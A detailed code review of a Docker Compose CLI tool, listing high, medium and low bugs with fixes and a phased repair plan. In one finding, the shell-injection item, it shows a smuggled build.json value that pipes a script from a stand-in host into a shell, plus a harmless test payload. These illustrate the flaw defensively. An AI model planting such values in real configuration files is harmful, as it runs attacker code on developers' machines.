# Detailed bug compilation: `@solid-stack/builder` v1.0.6

**Totals:** 10 High, 29 Medium, 17 Low.

---

# 🔴 HIGH

## H1. Relative `-C/--project-dir` doubles the path and mis-mounts volumes
**Where:** `handleServiceUp`, `handleCheck`, `service/command.ts` hook, `runCompose`, `teardownCompose`, `compileEnvironment`, `checkDockerfileContract`, `checkComposeContract`, `checkMeshTester`. Only the mesh handlers call `path.resolve`.

**Mechanism:** `projectDir` is passed through as typed. Two things then go wrong:
```ts
spawnSync("docker", ["compose", "--project-directory", projectDir, ...], { cwd: projectDir })
```
With `projectDir = "./services/backend"`, the child starts in `services/backend`. Docker then resolves `--project-directory ./services/backend` against that cwd, giving `services/backend/services/backend`.

In the checkers, `-v "./services/backend:/project"` is not a bind mount. Docker treats a path without a leading `/` or `./`-style prefix as a named volume. Even with `./` some Docker versions reject it.

**Scenario:** The help text advertises `builder check -C ./services/backend`. It either fails with a missing directory or runs conftest against an empty auto-created volume. That volume can make the policy check pass without checking anything.

**Fix:** Resolve once at the CLI boundary and use absolute paths below it.
```ts
const projectDir = path.resolve(options.projectDir ?? process.cwd());
```
Do this in a shared `resolveProjectDir()` used by every command, including the `preAction` hook.

**Verify:** From the repo root, run `builder check -C ./examples/backend` and `builder service up dev -C examples/backend --debug`. Add a test that passes a relative path.

---

## H2. All stages share one Compose project name, so `down -v` can destroy dev data
**Where:** `compileEnvironment` (`-p projectName`, `attachName`), `compileMeshEnvironment` (`name: projectName`), `teardownCompose`.

**Mechanism:** Every stage uses `buildJson.name`, or the directory basename. dev, test, e2e and prod all produce containers like `backend-app-1`, the same network names and the same volume names. `teardownCompose` runs `down -v --remove-orphans`.

**Scenario:**
1. `builder service up dev -d` starts the app and its database volume.
2. In another terminal, `builder service up test` recreates `backend-app-1` with the test image. That kills the dev app.
3. When tests finish, `down -v` removes the project's volumes, including the dev database. `--remove-orphans` also removes dev-only containers.

The same applies to a mesh test run while a mesh dev is up. CI jobs that run in parallel on one Docker host also collide.

**Fix:** Derive the project name per stage: `${name}-test`, `${name}-e2e`, and optionally a short random suffix for CI. Normalize it (see M8). Keep `dev` and `prod` on the plain name only if you want `up`/`down` to be addressable.

**Verify:** Start dev detached, run `up test-unit`, and confirm `docker ps` still shows the dev container and `docker volume ls` still shows its volumes.

---

## H3. Shell-string commands built from `build.json` values (injection, quoting, portability)
**Where:** `runStep` (`shell: true`), and its callers `checkDockerfile`, `checkDockerfileContract`, `checkComposeContract`, `checkMeshTester`.

**Mechanism:** Commands are built by interpolation:
```ts
`docker run --rm -i hadolint/hadolint hadolint --failure-threshold error - < "${dockerfileRel}"`
`docker run ... openpolicyagent/conftest test ${fileArgs} -p "${policyRel}/" --all-namespaces`
```
`dockerfile`, `policy.*`, and every `dependencies[].path` / `overrides[].path` / `composeFiles[]` entry come from `build.json`.

**Impact:**
- **Security:** `"dockerfile": "x\"; curl evil.sh | sh; \""` runs arbitrary commands. A malicious or compromised repo's `build.json` is enough, and the `service` hook runs `checkInfra` on every `up`.
- **Correctness:** `$`, backticks, `"`, `\` or `!` in a path break or alter the command. `fileArgs` is quoted per file but still shell-parsed.
- **Portability:** `< file` redirection and `"..."` quoting differ on Windows `cmd`/PowerShell.

**Fix:** No shell. Use argument arrays:
```ts
spawnSync("docker", ["run","--rm","-i","hadolint/hadolint:<pinned>","hadolint","--failure-threshold","error","-"],
  { cwd: projectDir, input: readFileSync(dockerfilePath), encoding: "utf-8" });
spawnSync("docker", ["run","--rm","-v",`${projectDir}:/project`,"-w","/project","openpolicyagent/conftest:<pinned>","test",...files,"-p",`${policyRel}/`]);
```
Change `runStep` to accept `(file, args[], opts)`. Reject paths that escape `projectDir` unless that is intended.

**Verify:** Test with a `dockerfile` value containing `"; touch /tmp/pwned; "` and assert the file isn't created.

---

## H4. Signals and exit codes: leaked containers, false success
**Where:** `runCompose`, `teardownCompose`, `runTestUnit`, `runTestE2e`, `runMeshTestE2e` (all `spawnSync`).

**Mechanism, part 1 (false success):**
```ts
return runResult.status ?? (runResult.error ? 1 : 0);
```
If Docker is killed by a signal, `status` is `null`. The `error` branch is already handled by the earlier `throw`, so it is dead code and the expression returns **0**. A test run killed by OOM or SIGKILL reports success.

**Mechanism, part 2 (leak):** `spawnSync` blocks the event loop. On Ctrl+C, the whole foreground process group gets SIGINT. Compose begins a graceful stop, but Node's default SIGINT behavior terminates immediately and `finally { teardownCompose(...) }` never runs. Test containers, networks and volumes remain.

**Scenario:** A developer interrupts a long E2E run. The next run collides with the leftover containers (see H2) or reuses stale volumes.

**Fix:**
- Handle `signal`: `if (r.signal) return 128 + os.constants.signals[r.signal]`.
- Move to async `spawn`. Register `SIGINT`/`SIGTERM` handlers that run `teardownCompose` once, then exit with the mapped code. A guard flag prevents double teardown.
- Return a typed result `{ code, signal }` instead of a bare number.

**Verify:** Start `up test-e2e`, send SIGINT, and confirm `docker ps -a` and `docker volume ls` are clean. Unit test the exit-code mapping with a mocked `spawn`.

---

## H5. Templates require env files that the code treats as optional
**Where:** `docker-compose.{dev,prod,test,e2e}.yml`, `compileEnvironment`.

**Mechanism:** The code does:
```ts
const hasEnvFile = existsSync(envFile);
if (hasEnvFile) composeFlags.push("--env-file", envFile);
```
which implies a missing env file is fine. But the templates declare `env_file: [.env.dev]` (and `.env.prod`, `.env.test`, `.env.e2e`) as required. Compose fails during `config` with "env file … not found".

Related defects in the same area:
1. **`--env-file` replaces the default `.env`.** Once passed, `.env` in the project directory is no longer used for interpolation, which is surprising.
2. **e2e stage mismatch:** the code checks `.env.e2e`, but the e2e stage composes the **prod** template, which needs `.env.prod`. Nothing checks that file.
3. `--env-file` (interpolation) and `env_file:` (container environment) are two different mechanisms. The code conflates them.

**Fix:** Use the long form in the templates:
```yaml
env_file:
  - path: .env.dev
    required: false     # Compose >= 2.24
```
Or fail early with a clear message naming every env file the stage needs. Decide on `.env` semantics: if you want it, pass multiple `--env-file` flags (`.env` first, then `.env.<stage>`).

**Verify:** Run each stage in a project with no env files, and check the error message or success.

---

## H6. `standalone.yml` port mapping has no defaults
**Where:** `docker-compose.standalone.yml`, used by dev and prod.

**Mechanism:** `"${PUBLIC_PORT}:${PORT}"`. If either variable is unset, Compose substitutes an empty string, giving `":"` or `":3000"`, and fails with an unhelpful "invalid port" error. `docker-compose.e2e.yml` already uses `${PORT:-3000}`, so the files are inconsistent.

**Fix:** `"${PUBLIC_PORT:-3000}:${PORT:-3000}"` for a default, or `"${PUBLIC_PORT:?PUBLIC_PORT must be set}:${PORT:?PORT must be set}"` for a clear failure.

**Verify:** `builder service up dev --debug` in a project without those variables.

---

## H7. Mesh healthcheck ignores configured port and assumes Node
**Where:** `compileMeshEnvironment` (healthcheck block, `serviceConfig.port`).

**Mechanism:**
```ts
test: ["CMD","node","-e","require('net').connect(process.env.PORT || 3000, '127.0.0.1')..."]
```
- `serviceConfig.port` only affects `ports: ["p:p"]`. It never sets `PORT` in the container's environment.
- The probe needs `node` inside the image.
- It always replaces any healthcheck the service or its override defines.
- The probe connects to `127.0.0.1`, which fails for services bound to a specific interface.

**Scenario:** A service configured with `port: 4000` that doesn't set `PORT` listens on 4000. The probe checks 3000 and never succeeds after 10 retries. Everything with `condition: service_healthy` (other services, the tester) never starts. A Python or Go service has no `node` at all.

**Fix:** Inject `environment.PORT = serviceConfig.port` (unless already set). Skip generating a healthcheck if the service already has one. Allow a `healthcheck` field in `mesh.json`. Document the Node requirement or use a shell-free alternative.

**Verify:** A mesh fixture with `port: 4000`. See also M29.

---

## H8. Mesh volume rewriting and missing top-level resources
**Where:** `resolveServicePaths`, and the override `volumes` mapper in `compileMeshEnvironment`.

**Defects:**
1. **Named volumes become bind mounts.** `db_data:/var/lib/postgresql` has a first segment that doesn't start with `/`, so it is treated as a host path and rewritten to something like `./../../db_data:/var/lib/postgresql`.
2. **`:ro` and other options are dropped in the override mapper.** `const [host, container] = vol.split(":")` ignores the third segment, so `./src:/app:ro` becomes `./src:/app`. (`resolveServicePaths` does preserve `parts.slice(1).join(":")`, so the two mappers disagree.)
3. **Top-level `volumes:`, `networks:`, `secrets:`, `configs:`** from mock and tester files are never merged into `composeConfig`. Named volumes then fail with "refers to undefined volume".
4. **Long-form entries are not rebased:** `{type: bind, source: ./x, target: /y}` and `env_file` entries.
5. **`container_name`** isn't stripped, so the same mock used by two services collides.
6. Windows drive paths (`C:\...`) break the colon-split logic.

**Fix:** A bind mount is a source that starts with `.`, `/` or `~` (or is a drive path). Anything else is a named volume left alone, with its definition copied up. Share one volume parser between both code paths. Handle the object form. Copy top-level resources with a collision check or namespacing.

**Verify:** A mock with `db_data:/var/lib/postgresql` and `./seed:/seed:ro`, then inspect `compose config` output.

---

## H9. Mesh dependency routing likely fails when names differ *(verify)*
**Where:** `compileMeshEnvironment` (`provideMap`, aliases).

**Mechanism:** For a consumer whose `build.json` depends on `depKey`, if `provideDependency[depKey] = "auth-api"`, the code adds `depends_on: auth-api-app`. But the consumer's code calls hostname `depKey`. The provider is aliased only as `auth-api` and `auth-api-app` on `mesh`, so `depKey` resolves only when it equals the provider's name.

The existing test passes (`AUTH_API_URL=http://auth-api:3000`) because the environment variable already uses the provider's name.

Also missing:
- Validation that `provideMap[depKey]` names an existing mesh service (a typo creates a `depends_on` on a nonexistent service).
- Cycle detection (A provides to B, B provides to A deadlocks on `service_healthy`).
- The root-level `mesh.dependencies[depKey]` branch is aliased only by `depKey`.

**Fix:** Add `depKey` as an alias on the provider's `mesh` network entry (a second pass once all services exist), or on the consumer's private network pointing to the provider. Validate targets and detect cycles in `checkMeshJson`.

**Verify:** A fixture where the consumer's dependency key is `filesystem` and the provider service is `files-svc`.

---

## H10. Dev template doesn't protect `node_modules` *(verify)*
**Where:** `docker-compose.dev.yml` vs `compileMeshEnvironment` and your own `docker/docker-compose.yml`.

**Mechanism:** The dev template mounts `.:/app`. The mesh compiler and your own compose file also add the anonymous `/app/node_modules` volume. Without it, the host directory shadows the `node_modules` installed in the image, and a Node app that relied on image-installed dependencies fails to start (or uses host-platform binaries). The result: `service up dev` and `mesh up dev` behave differently for the same service.

**Fix:** Add `- /app/node_modules` to the dev template, or document that Dockerfiles must not rely on it. Ideally generate both paths from the same source (see M6).

**Verify:** Run a Node service that has no host `node_modules` through `service up dev`.

---

# 🟠 MEDIUM

## Compile and merge logic

**M1. Mesh env precedence is inverted.** `environment = {INFRA_MODE, EXEC_MODE, ...envOverrides}`, then the override file's `environment` is applied with `Object.assign`, overwriting `mesh.json` values. The more specific, per-mesh config should win. Array-form entries without `=` (pass-through `FOO`) are skipped, so such variables vanish. *Fix:* apply `envOverrides` last, and support bare names.

**M2. Arbitrary service chosen from an override file.** `services.app || services[serviceName] || Object.values(services)[0]`. A multi-service override file can apply the wrong service's environment and volumes. *Fix:* require `app` or the named service, else error.

**M3. Silent skip vs. hard error.** A missing root-dependency compose file, or a missing service within it, is silently ignored (`if (existsSync(...))`). A missing per-service mock throws. The skip surfaces later as a confusing `depends_on` error. *Fix:* throw with the same message style.

**M4. Only the first service of a mock or tester file is copied.** `Object.values(parsed.services)[0]` or `Object.keys(...)[0]`. Sidecars (a mock's DB, a browser container) are dropped and the `depends_on` references dangle. *Fix:* copy the whole dependency closure of the selected service.

**M5. Array-form `depends_on` in raw YAML loses entries.** `resolvedTester.depends_on = resolvedTester.depends_on || {}` and then `depends_on["x-app"] = …` sets a property on an array, which `yaml.stringify` drops. `getBuildJson` normalizes this only for `build.json`'s own `services`. *Fix:* a shared `normalizeDependsOn()` for every parsed compose service.

**M6. Hardcoded assumptions and template bypass in the mesh.** Fixed `/app`, `target: mode`, `ports: "p:p"` (host = container port), `init: true`, logging config. Override files honor only `environment` and `volumes`, so `command`, `ports`, build args, `healthcheck` and others are ignored without warning. The mesh path ignores `docker-compose.{base,dev,prod}.yml`, so `service up` and `mesh up` drift. *Fix:* merge the full override service (deep-merge), or build on the shared templates. Warn on ignored keys.

**M7. `renameServicesWithDependencies` is incomplete.** It renames only the map keys. References in `depends_on`, `links`, `network_mode: service:x`, `volumes_from` and `extends` still use the old name. `find` matches only the first dependency per `serviceName`. A rename onto an existing key silently overwrites it. It throws a bare `Error` rather than `ScriptError` (so it is reported as a generic error).

**M8. Project names.** `compileEnvironment` uses `buildJson.name` raw. `My App` or `@scope/pkg` is invalid (lowercase letters, digits, `-`, `_`; must start with a letter or digit). `attachName` writes it into the YAML. The mesh `normalizeProjectName` produces names that can start with `-`/`_` or be empty. *Fix:* one shared normalizer with a leading-character fix and a fallback.

**M9. Service-key collisions aren't detected.** A tester service name, `<svc>-app`, root dependency keys and `<svc>-<dep>` mocks share one `composeConfig.services` map, and later writes win silently.

**M10. `--debug` prints interpolated secrets.** `docker compose config` inlines values from `.env*`. The full YAML is printed to the terminal and possibly CI logs. *Fix:* warn, redact keys matching `/(SECRET|TOKEN|PASSWORD|KEY)/i`, or write to a file.

**M11. Dry-run gaps.** Mesh `--dry-run` still runs the hadolint and conftest containers via `checkMesh`, and validates through `docker compose config`. `service up` has no `--dry-run`.

**M12. `getTemplatesDir`.** A relative `BUILDER_TEMPLATES_DIR` is resolved against whatever cwd is current (and later against the child's cwd). A set-but-nonexistent value is silently ignored instead of reported. `compileEnvironment` resolves all six templates for every stage, so a missing unused one breaks everything. The `cachedTemplatesDir` is bypassed whenever the env var is set. The error is a bare `Error`.

**M13. `extractOverrides` accepts unknown stage keys.** `"prd"` or `"production"` is silently ignored. *Fix:* restrict keys to the known stage enum and error on others.

## Test runners and checks

**M14. `teardownCompose` ignores a non-zero exit.** Only `error` is logged. Failed cleanup (leaked volumes, see H2/H4) is invisible. It also hardcodes `-v`, which is destructive. Consider an opt-out flag for debugging failed runs.

**M15. Checks run too often and unpinned.** The `service` hook runs `checkInfra` (up to 3 Docker containers) before every `up`, including `dev`. Images are `:latest`, so results change over time and each run may pull from the network. *Fix:* pin tags or digests, add `--skip-checks`, and cache results by file hash.

**M16. Duplicated work and output.** `runMeshTest` calls `checkMesh`, then `runMeshTestE2e` calls it again. `runTest` prints a banner, and `runTestUnit`/`runTestE2e` print their own, so each stage shows two banners and two pass/fail lines. Mesh runners also call `runTest` per service, which does the same.

**M17. `runStep` robustness.** It ignores `result.error`, so ENOENT or ENOBUFS gives "step failed" with no cause. `maxBuffer` defaults to 1 MB, so large conftest output can fail the step. Output is buffered and printed at the end rather than streamed.

**M18. `checkDependencies`.** `command -v docker` is a shell builtin and fails on Windows `cmd`. It doesn't verify the `docker compose` v2 plugin that the whole tool relies on, or that the daemon is reachable. It is attached only to the `service` hook, not to `mesh` or `check`. *Fix:* run `docker compose version` and `docker info`, and register a program-level hook.

**M19. `getBuildJson` validation.** `JSON.parse` can return `null`, an array or a primitive. Downstream `buildJson.name` then throws a `TypeError`. `readFileSync` errors (EACCES, EISDIR) are reported as "Failed to parse".

## Build and packaging

**M20. Divergent build paths.** `pnpm build` is `tsc … && tsc-alias`, `scripts/build.ts` runs `tsup` plus `tsc --emitDeclarationOnly`, and `dev` runs `tsup --watch`. They can produce different output layouts, which matters for `templates` and `version.ts` resolution.

**M21. `prepublish-check.ts` is too thin.** It checks only `dist/bin.js`. Missing `templates/docker/*` is the most likely publish-time failure, since `getTemplatesDir` throws at runtime. Also check the shebang and executable bit on `bin.js`, and run `npm pack --dry-run` to inspect the tarball against `files`.

**M22. `prepublishOnly` runs tests that need Docker and a sibling repo** (`../../agnostic-build-sys`). Publishing from a clean machine or CI fails.

**M23. `@types/yaml@^1.9.7`** is a deprecated stub, since `yaml@2` bundles its types. It can shadow the real types. Remove it.

**M24. Engine mismatch.** `engines.node >=18` sits beside `@types/node ^26`, `commander ^15`, `vitest ^4`, TypeScript 7 and pnpm 11. Check each dependency's own `engines` field and raise yours. Node 18 is end-of-life.

**M25. Metadata.** The `"cjs"` keyword is wrong for `"type": "module"`. `UNLICENSED` with `publishConfig.access: public` is unusual. No `types`/`exports`/`main` means the emitted `.d.ts` files aren't reachable if you intend a programmatic API.

## Tests

**M26. Hard-coded external path.** `../../agnostic-build-sys/services/backend` is outside the repo. The `compileEnvironment`, `cli` and `checkInfra` tests fail for anyone without that checkout, and the paths are repeated per file.

**M27. Tests need Docker.** Compose config, hadolint and conftest all run for real, so tests are slow and environment-dependent. *Fix:* mock `spawnSync` for unit tests and gate real-Docker tests behind an env flag such as `RUN_DOCKER_TESTS=1`.

**M28. Untested core paths:** `runCompose` exit/signal mapping, `teardownCompose`, `explainComposeMergeFailure` against real Compose output, the volume rewriter, env precedence, and port/healthcheck behavior. Also missing: failure-path tests for the `finally` teardown.

**M29. A fixture passes by accident.** The mesh test asserts `AUTH_API_URL=http://auth-api:3000`, which matches only because the hardcoded probe/port is 3000 (H7). It would hide the bug. Add a case with a non-3000 port and a differing dependency key (H9).

---

# 🟡 LOW

**L1. Unit tests could stop early.** `runTestUnit` uses `--abort-on-container-exit` without `--exit-code-from app`. With only `app` in the `test` template this is fine. A user override that adds a sidecar which exits 0 could end the run before tests execute (false green). Cheap fix: add `--exit-code-from app`.

**L2. `@/` alias.** It works for `tsc` builds via `tsc-alias`, but it is mixed with relative imports (`runCompose.ts`, `service/command.ts`, `up/handler.ts` vs. the rest). Confirm `vitest.config` and `tsup.config` (not provided) map it. Pick one style.

**L3. `explainComposeMergeFailure` is unused outside tests.** `compileEnvironment` throws raw stderr. Wire it into the error path. Its regexes: `serviceName` is unescaped (regex injection); `^\s{2}` assumes 2-space indentation and `\s` crosses newlines; the lazy `[\s\S]*?^\s{4,}(image|build):` can match the *next* service's `image:`, giving false "defines image/build". Parse the YAML and inspect `services[name]` instead. The `filesUsed.filter(f => f !== "-f")` also leaves other flags such as `-p` and `--env-file` in the list.

**L4. `BuildJson.services` appears unused** *(verify)*. The array to object `depends_on` normalization in `getBuildJson` has no visible consumer.

**L5. Weak types.** `BuildJson` lacks `dockerfile`, `policy`/`policies` and `composeFiles`. `BuildJson` and `MeshConfig` both have `[key: string]: any`. This produces the `as string | undefined` casts and unchecked property access.

**L6. Four overlapping option types:** `RunOptions`, `ServiceUpOptions`, `MeshUpOptions` (unused), `MeshRunOptions`.

**L7. Stage names are scattered.** They appear in `Environment`, `MeshStage`, two handler switches and error strings. `Environment` uses `e2e` while the CLI uses `test-e2e`. `up tset` runs the full infra check (Docker containers) before failing on the unknown stage. *Fix:* one `as const` tuple and commander's `Argument.choices()`.

**L8. Mesh validation is duplicated** in `getMeshJson` and `checkMeshJson`. It is also hand-rolled while build.json uses zod.

**L9. `compileMeshEnvironment` re-parses dependencies on raw `any`** (`depInfo.path`) instead of reusing the validated `extractBuildDeps`, so malformed entries crash with a `TypeError`.

**L10. Near-duplicate runners:** `runDev`/`runProd` and `runMeshDev`/`runMeshProd` differ only in a string and an emoji.

**L11. Relative-path snippet repeated ~6 times:** `rel.startsWith(".") || rel.startsWith("/") ? rel : "./"+rel`. It treats `.hidden-dir` as already prefixed, and on Windows `path.relative` yields backslashes (or an absolute path across drives). Add a `toComposePath()` helper that normalizes to POSIX.

**L12. Error handling boilerplate:** `catch (err: any)` with `err?.message || String(err)` appears ~10 times. Use `unknown` and an `errorMessage()` helper.

**L13. `cli.ts` issues.** The `commander.helpDisplayed`/`commander.version` branches never fire without `exitOverride()`. `process.env.VITEST` is test logic in production code. Non-`ScriptError` failures print only the message, with no stack. Add `--verbose` or `DEBUG=`.

**L14. `ScriptError`.** `Object.setPrototypeOf(this, new.target.prototype)` is unnecessary at target ES2022. Add `cause` support and an optional `exitCode` so failures map to distinct codes.

**L15. `exactOptionalPropertyTypes` friction.** It causes the `requireTester !== undefined ? {…} : {}` ternaries and `testerServiceName?: string | undefined`. Declare those props as `T | undefined`.

**L16. Small items:**
- Unused imports in `up/handler.ts` (`pc`, `checkDependencies`, `checkInfra`).
- The `preAction` hook body is mis-indented, and `thisCommand` is unused.
- `import z from "zod"` vs `import { z } from "zod"`.
- `ZodError.message` is a raw JSON blob; format `issues`.
- Check numbering ("1." to "4.") doesn't adapt to skipped steps.
- `checkYamlFiles` stops at the first error and fails on multi-document YAML (`parse` vs `parseAllDocuments`).
- `tsconfig` `include` lists `tsup.config.ts`/`vitest.config.ts` that may not exist.

**L17. Your own `docker/` files.**
- The `prod` stage copies only `dist` and runs `pnpm test`, which doesn't verify the package.
- `CMD ["pnpm","build"]` after `RUN pnpm build` is redundant.
- No non-root `USER`.
- No `.dockerignore` was provided, so `COPY . .` can pull in host `node_modules` and `dist`.
- `name: package-template` is a template leftover.
- The `build` service mounts `..:/app`, which can overwrite the image's build output.

---

# Recommended fix plan

| Phase | Items | Why first |
|---|---|---|
| 1. Quick wins | H5, H6, H10, M13, L1 | A few lines each, and the most likely day-to-day failures |
| 2. Safety | H1, H2, H3 | Prevents data loss, wrong-directory runs and injection |
| 3. Process layer | H4, M14, M16, M17, M18 | One `runProcess` helper with signal handling, exit mapping, streaming and teardown guard |
| 4. Mesh compiler | H7, H8, H9, M1–M9 | Needs a fixture project with non-default ports, named volumes and differing dependency keys |
| 5. Tests and packaging | M20–M29 | Hermetic tests so `prepublishOnly` runs anywhere, and one build path |
| 6. Cleanup | L-items, M10–M12, M15 | Consolidate types, stages and runners, and wire up the error explainer |
